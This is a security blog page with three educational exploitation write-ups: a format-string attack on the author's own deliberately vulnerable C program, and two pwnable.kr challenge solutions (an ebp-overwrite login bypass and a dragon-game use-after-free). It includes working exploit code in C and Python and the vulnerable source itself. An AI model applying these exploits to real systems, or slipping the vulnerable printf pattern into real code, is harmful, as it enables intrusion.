
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="ja"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Sheep Shellcode</title>
  <meta name="author" content="Vincent Moscatello">

  
  <meta name="description" content="UF-SIT, UF’s cyber security club, is holding lightning talks on the 17th of Novemeber! I’ve decided that an awesome way to peek people’s interest in &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://quantumvm.github.io//github/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Sheep Shellcode" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  
  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-67946241-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body >
  <div id="container">
    <header role="banner"><hgroup>
  <h1><a href="/">Sheep Shellcode</a></h1>
  
    <h2>The hackery blog of Vincent Moscatello.</h2>
  
</hgroup>

</header>
    <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:quantumvm.github.io//github" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/tutorials">Tutorials</a></li>
  <li><a href="/resume/MoscatelloResume.pdf">Resume</a></li>
  <li><a href="/archives">Archives</a></li>
</ul>

</nav>
    <div id="main">
      <div id="content">
        <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/11/12/tale-of-a-format-string/">Tale of a Format String</a></h1>
    
    
      <div class="post-meta">
        <p class="meta">
          <span class="timestamp">- 








  



<time datetime="2015-11-12T15:09:04-05:00" pubdate data-updated="true"></time> -</span>
          
        </p>
      </div>
    
  </header>


  <div class="entry-content"><p>UF-SIT, UF’s cyber security club, is holding lightning talks on the 17th of Novemeber! I’ve decided that an awesome way to peek people’s interest in reverse engineering and exploitation is to give a talk on format string vulnerabilities. This talk is aimed at people that really want to learn more, but are stuck doing basic stack-based buffer overflows.</p>

<p>To understand format string exploits, first you need a program that can be exploited. I decided to write a program that should be easily exploitable on Ubuntu 14.04 with all of the standard flags for gcc left enabled.</p>

<p><img class="center" src="/images/format-strings/normalrun.png"></p>

<p>It’s a mocking game! It simply repeats back whatever string it receives. Let’s take a look at the source code of the program to see if we can come up with an idea on how to exploit it.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="n">foobar</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)</span> <span class="p">();</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span><span class="n">foobar</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">you_lose</span><span class="p">(){</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;yak yak yak GET A JOB!&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">you_win</span><span class="p">(){</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;HACK THE PLANET&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">foobar</span> <span class="n">test</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;This is the Mocking game. The only way to win is&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;not to play!&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>    <span class="n">test</span><span class="p">.</span><span class="n">function</span> <span class="o">=</span> <span class="n">you_lose</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">test</span><span class="p">.</span><span class="n">function</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The vulnerability occurs because the user can control the format string passed to printf:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This vulnerability could be easily fixed by using the printf function appropriately!:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="o">%</span><span class="n">s</span><span class="err">”</span><span class="p">,</span> <span class="n">buffer</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>It’s a very subtle difference, but watch what happens when we enter some input that the programmer was not expecting like the character percent followed by the character x.</p>

<p><img class="center" src="/images/format-strings/format-string-percent-x.png"></p>

<p>We’ve started to leak information from the stack! In fact we’ve leaked so much information that we’ve reached the area on the stack where our format string was stored! Just for clarity the format string is the first line with (AAAABBBBCC..). Let’s stop a moment to see why this happens.</p>

<p><img class="center" src="/images/format-strings/format-string.png"></p>

<p>On x86, when a function is called using CDECL calling conventions, its parameters are pushed on the stack in reverse order as seen above. When printf wants to use parameter 2, the second percent d, it reaches all the way up the stack to 2 or (esp + 8). When we control these percent d, like in our vulnerable program, we can read as far up the stack as we want!</p>

<p><img class="center" src="/images/format-strings/fgets.png"></p>

<p>When we look at this assembly language in IDA, fgets is storing the format string itself at esp+1C (esp+28) This means that by going as far as 7 percent xs we can start reaching data we can control!</p>

<p>Printf even has a useful feature called direct parameter access that allows us to skip placing percent x over and over again and just reference a value from its relative location on the stack!</p>

<p><img class="center" src="/images/format-strings/direct-parameter-access.png"></p>

<p>I am sure it has an “actual” application outside of exploitation, but let’s be honest that’s pretty darn convenient.</p>

<p>All we’ve done now is READ data data from the stack. Maybe that’s useful for a memory leak but how can we use the printf function to control the flow of our application? Surprisingly printf actually allows us to WRITE data to the stack using the percent n parameter. Yep.</p>

<p>Percent n allows the user to write the total number of bytes that will be printed by printf up to the point where the format string is encountered. The amount of information percent n writes is 4 bytes on x86. Let’s figure out what address we have to write and where we have to write it.</p>

<p>The easiest way to break the program is to overwrite the function pointer found in the foobar struct.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="n">foobar</span><span class="p">{</span>
</span><span class='line'>    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)</span> <span class="p">();</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span><span class="n">foobar</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Later on in the program, we see that an instance of the struct, called test, is initialized in the bss segment right above main. Let’s find this struct in memory using IDA.</p>

<p><img class="center" src="/images/format-strings/test-struct-before.png"></p>

<p>When we look at this memory in debug mode we see that the address of the lose function (picture below) is written to this address.</p>

<p><img class="center" src="/images/format-strings/lose-function.png"></p>

<p>The address is written into memory using little endian byte order.</p>

<p><img class="center" src="/images/format-strings/lose-in-struct.png"></p>

<p>We want to change this address stored at 0804A060 to the address of our win function (picture below)</p>

<p><img class="center" src="/images/format-strings/you-win-function.png"></p>

<p>An obvious issue that we encounter is that the address 0x08048501 = 134513921. To use our percent-n method we would have to have printf print almost 134 megabytes worth of junk! That’s a rather huge amount of writing. Let’s exploit the fact we are using little endian byte order! We can perform 4 writes instead of 1 write. The picture below provides an illustration of what our final exploit will look like.</p>

<p><img class="center" src="/images/format-strings/format-string-structure.png"></p>

<p>To calculate the “value to write” for the percent u we can use a simple function that increments our total byte counter until the lowest byte is equal to the byte we want to write. We can then return the total number of bytes we have to add to our format string to get there.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="kt">int</span> <span class="nf">get_distance</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span> <span class="n">start_number</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">target</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">u</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span> <span class="p">((</span><span class="kt">uint8_t</span><span class="p">)</span> <span class="o">*</span><span class="n">start_number</span><span class="p">)</span> <span class="o">!=</span> <span class="n">target</span><span class="p">){</span>
</span><span class='line'>        <span class="p">(</span><span class="o">*</span><span class="n">start_number</span><span class="p">)</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>        <span class="n">u</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">u</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is the rest of our exploit that prints our targeted format string to stdout.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//address of function pointer. We can only overwrite 1 byte at a time.</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">byte_1</span> <span class="o">=</span> <span class="mh">0x0804A060</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">byte_2</span> <span class="o">=</span> <span class="mh">0x0804A061</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">byte_3</span> <span class="o">=</span> <span class="mh">0x0804A062</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">uint32_t</span> <span class="n">byte_4</span> <span class="o">=</span> <span class="mh">0x0804A063</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte_1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte_2</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte_3</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte_4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//our byte count starts at 0x10 (from byte_1, byte_2…)</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//WIN FUNCTION LOCATION: 0x08048501</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//01</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">d</span> <span class="o">=</span> <span class="n">get_distance</span><span class="p">(</span><span class="o">&amp;</span><span class="n">count</span><span class="p">,</span> <span class="sc">&#39;\x01&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%%%du&quot;</span><span class="p">,</span><span class="n">d</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&quot;%7$n&quot;</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//85</span>
</span><span class='line'>    <span class="n">d</span> <span class="o">=</span> <span class="n">get_distance</span><span class="p">(</span><span class="o">&amp;</span><span class="n">count</span><span class="p">,</span> <span class="sc">&#39;\x85&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%%%du&quot;</span><span class="p">,</span><span class="n">d</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&quot;%8$n&quot;</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//04</span>
</span><span class='line'>    <span class="n">d</span> <span class="o">=</span> <span class="n">get_distance</span><span class="p">(</span><span class="o">&amp;</span><span class="n">count</span><span class="p">,</span> <span class="sc">&#39;\x04&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%%%du&quot;</span><span class="p">,</span><span class="n">d</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&quot;%9$n&quot;</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">//08</span>
</span><span class='line'>    <span class="n">d</span> <span class="o">=</span> <span class="n">get_distance</span><span class="p">(</span><span class="o">&amp;</span><span class="n">count</span><span class="p">,</span> <span class="sc">&#39;\x08&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%%%du&quot;</span><span class="p">,</span><span class="n">d</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s">&quot;%10$n&quot;</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is what our exploit will look like when printed to standard out:</p>

<p><img class="center" src="/images/format-strings/printexploit.png"></p>

<p>Let’s see what happens when we shove the exploit into our mocking game program!</p>

<p><img class="center" src="/images/format-strings/test-winning.png"></p>

<p>HACK THE PLANET! We win!</p>

<p><img class="center" src="/images/format-strings/victory.png"></p>
</div>
  
  


      <footer>
      
      - <a href="/blog/2015/11/12/tale-of-a-format-string/">Tale of a Format String</a>
      <time datetime="2015-11-12T15:09:04-05:00" pubdate><span class='month'>Nov</span> <span class='day'>12</span> <span class='year'>2015</span></time>
      
      </footer>
    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/10/19/login-profit/">Login + ? = Profit</a></h1>
    
    
      <div class="post-meta">
        <p class="meta">
          <span class="timestamp">- 








  



<time datetime="2015-10-19T22:06:40-04:00" pubdate data-updated="true"></time> -</span>
          
        </p>
      </div>
    
  </header>


  <div class="entry-content"><p>Simple login is a 50 point 32bit pwnable from pwnable.kr! Although finding the vulnerability in this challenge was pretty simple, the actual exploitation was a bit trickier than your standard buffer overflow. This write-up contains spoilers so if that’s important to you, try out the challenge for yourself first!</p>

<p><img class="center" src="/images/simple-login/normal.png"></p>

<p>The point of this challenge is to try and bypass the “Authenticate” prompt above. When running the executable normally the program appears to take whatever string you entered, perform some operation on it, then hash that value and print the hash below.</p>

<p><img class="center" src="/images/simple-login/base64decode.png"></p>

<p>Doing some further reverse engineering reveals that this “operation” before hashing is simply a base64 decoding of whatever string you entered.</p>

<p><img class="center" src="/images/simple-login/copy-to-datasegment.png"></p>

<p>Further reverse engineering also revealed that the program has a function called auth (0x08049402 above).  When called the auth function compares the hashed value of your base64 decoded string to a hash compiled right into the executable. An obvious first approach would be to try and brute the hash but unfortunately the password for the hash was not easily guessable.</p>

<p><img class="center" src="/images/simple-login/second-memcpy.png"></p>

<p>It’s time to get a bit more creative, upon further analysis of the auth function it becomes clear that it may be possible to cause a 4 byte overflow using the memcpy function. You can figure this out by looking at addresses 0x080492B1, 0x080492B4, and 0x080492A2. Starting at address 0x080492B1, the address of the base pointer minus 20 is loaded into eax. At 0x080492B4 12 bytes are then added to eax. This makes 20 – 12 = 8 bytes of space for the memcpy function to write into. At 0x080492A2, arg_0 contains the length of our string after it’s been base64 decoded.  This string length can be up to 12 bytes large! We can copy 12 bytes into an 8 byte buffer, BUFFER OVERFLOW!</p>

<p>But wait… A FOUR byte buffer overflow and not an EIGHT byte buffer overflow? All we can do with that is control ebp not the instructional pointer (eip)! To figure out a solution I relied on an obscure phrack article I read about a year ago <a href="http://phrack.org/issues/55/8.html">http://phrack.org/issues/55/8.html</a> . In the article klog describes how he is able to get code execution by exploiting a 1 byte overflow into ebp. Although his method doesn’t really work here with modern OS protections like DEP/ASLR enabled, we can still adapt his method to solve our problem.</p>

<p><img class="center" src="/images/simple-login/diagram.png"></p>

<p>The diagram I have drawn above does a good job at explaining how the attack works. In summation, we are using the fact that we control ebp after two function returns to get code execution. The trickiest part was figuring out the address to overwrite the base pointer with since most things were moving.</p>

<p><img class="center" src="/images/simple-login/datasegment.png"></p>

<p>Fortunately, our string is copied into the bss segment before making a call to auth. There is enough room here to allow us to store a fake ebp (just some padding) and an address we want to jump to.</p>

<p><img class="center" src="/images/simple-login/system.png"></p>

<p>BUT wait! The bss segment is unfortunately not executable so we can’t simply put some shellcode in it. In fact, there wouldn’t really be enough room to store the shellcode to begin with. The solution is to jump back into the text segment at the address in the picture above so we can all system.
Excellent! We now know everything we need to in order to write an exploit in python.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">base64</span>
</span><span class='line'>
</span><span class='line'><span class="c">#Call to system from the textsegment</span>
</span><span class='line'><span class="n">system</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span><span class="mh">0x08049284</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#This address is found in the data segment so it shouldn&#39;t relocate</span>
</span><span class='line'><span class="c">#even if aslr is enabled</span>
</span><span class='line'><span class="n">corrupted_ebp</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span><span class="mh">0x0811EB40</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#4 As are added as padding</span>
</span><span class='line'><span class="n">exploit</span> <span class="o">=</span>  <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="n">corrupted_ebp</span>
</span><span class='line'>
</span><span class='line'><span class="n">base_64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span><span class="p">(</span><span class="n">base_64</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>And finally, let’s claim the spoils of victory by feeding our exploit through ncat.</p>

<p><img class="center" src="/images/simple-login/victory.png"></p>
</div>
  
  


      <footer>
      
      - <a href="/blog/2015/10/19/login-profit/">Login + ? = Profit</a>
      <time datetime="2015-10-19T22:06:40-04:00" pubdate><span class='month'>Oct</span> <span class='day'>19</span> <span class='year'>2015</span></time>
      
      </footer>
    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/10/12/how-to-kill-a-dragon/">How to Kill a Dragon</a></h1>
    
    
      <div class="post-meta">
        <p class="meta">
          <span class="timestamp">- 








  



<time datetime="2015-10-12T16:08:17-04:00" pubdate data-updated="true"></time> -</span>
          
        </p>
      </div>
    
  </header>


  <div class="entry-content"><p><img class="center" src="/images/dragon/dragon.png" width="459" height="437"></p>

<p>Dragon is a 75 point pwnable from pwnable.kr. That being said, if you are afraid of spoilers, DON’T continue! Try out the challenge for yourself! The binary is a 32 bit dynamically linked elf that still has most of its symbols left in tack. It takes a bit of reverse engineering to actually figure out how to exploit it though.</p>

<p><img class="center" src="/images/dragon/welcome.png"></p>

<p>You can start the challenge by connecting with netcat to pwnable.kr on port 9004. The premise of the challenge is pretty simple, your older brother has designed an RPG game that’s impossible to win. The objective? Kill the dragon, pwn the box, and get the flag.</p>

<p>With ASLR and DEP enabled it was clear that this challenge was meant to be solved in a very particular way. After playing with the application for a bit, I loaded the binary into IDA.</p>

<p><img class="center" src="/images/dragon/find-the-secret.png"></p>

<p>The actual main function of the program was relatively uninteresting until it makes a call to the PlayGame function seen above. This is the same dialogue that asks you to select 1 if you would like to play as a knight and select 2 if you would like to play as a priest. The disassembly reveals a third option (3) that allows you to access a secret level!</p>

<p><img class="center" src="/images/dragon/secretlevel.png"></p>

<p>Unfortunately to actually access the secret level, you need a password and that password is not found anywhere in the binary. The only interesting part about the secret level is that it makes a call to system.</p>

<p><img class="center" src="/images/dragon/victory.png"></p>

<p>Assuming that at some point we find a vulnerability that gives us control of the instructional pointer, we should be able to jump directly to the address 0x08048DBF. This should work since the location of the text segment shouldn’t relocate because the application is compiled without PIE.</p>

<p>So how do we actually kill this dragon? The answer lies in the data structures used to keep track of the dragon’s information. At the beginning of the PlayGame function, the game allocates memory for two structs on the heap.</p>

<p><img class="center" src="/images/dragon/malloc.png"></p>

<p>The first 16 byte struct is used to keep track of the player’s information. The values in this struct are determined by weather the player chose a knight class or a priest class. These two classes have different attacks and different amounts of health.</p>

<p><img class="center" src="/images/dragon/priest-or-knight.png"></p>

<p>The priest has a unique attack where he can use a magic shield to avoid taking any damage. This shield does have a certain amount of mana and needs to be recharged after a couple of uses.</p>

<p>The second struct is a bit more interesting, it’s used to hold information about the dragon we are fighting.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='BASH'><span class='line'><span class="o">[</span> Mama Dragon <span class="o">]</span> <span class="m">80</span> HP / <span class="m">10</span> Damage / +4 Life Regeneration.
</span><span class='line'><span class="o">[</span> Baby Dragon <span class="o">]</span> <span class="m">50</span> HP / <span class="m">30</span> Damage / +5 Life Regeneration.
</span></code></pre></td></tr></table></div></figure>


<p>There are two types of dragons a baby dragon and a mother dragon. The baby dragon has less health but deals more damage and has a greater life regeneration. The mama dragon has more health but a lower damage and lower life regeneration. The kind of dragon you get to fight is determined by a counter that alternates back and forth between baby dragon and mama dragon. This counter does not reset between rounds.</p>

<p><img class="center" src="/images/dragon/mother-dragon.png"></p>

<p>One thing you may have noticed in the picture above is that the dragon’s health is stored in a single byte at eax+8. This means that the dragon’s health can only be within the range of 0 to 127. A dragon is considered defeated when its health has turned 0.</p>

<p>Since it’s mathematically impossible to kill the dragon by actually fighting it, the solution to killing the dragon is to not fight it at all! Specifically, to defeat the dragon we need to wait until the mama dragon regenerates enough health so that the mother dragon’s health overflows from 124 to 0.</p>

<p>Fantastic! So now we know how to defeat the dragon! But how does defeating the dragon help us get a shell? Defeating the dragon causes a use after free condition which can be exploited to gain control of the instructional pointer.</p>

<p><img class="center" src="/images/dragon/free.png"></p>

<p>Normally, when the dragon wins, the dragon struct is first freed and the “I defeated a dragon condition” is returned as false, or zero, in the register eax. However if eax returns 1 like in the green box, the dragon struct is used later on in the code even though its already been freed.</p>

<p><img class="center" src="/images/dragon/call-eax.png"></p>

<p>In some cases a mistake like this might only cause a crash, in this case though we make a call to malloc again that is the same size as the dragon struct that we just freed. Due to the way binning works on linux, the new malloc should be allocated in the block we just freed. This new malloc is user controlled and is meant to store the player’s name. If we enter the player’s name as an address then the call eax, which used to have a function pointer, will actually point to wherever we want it to!</p>

<p><img class="center" src="/images/dragon/use-after-free.png"></p>

<p>Let’s use some clever python to point the instructional pointer back inside of the secret function and get a shell on the remote machine.</p>

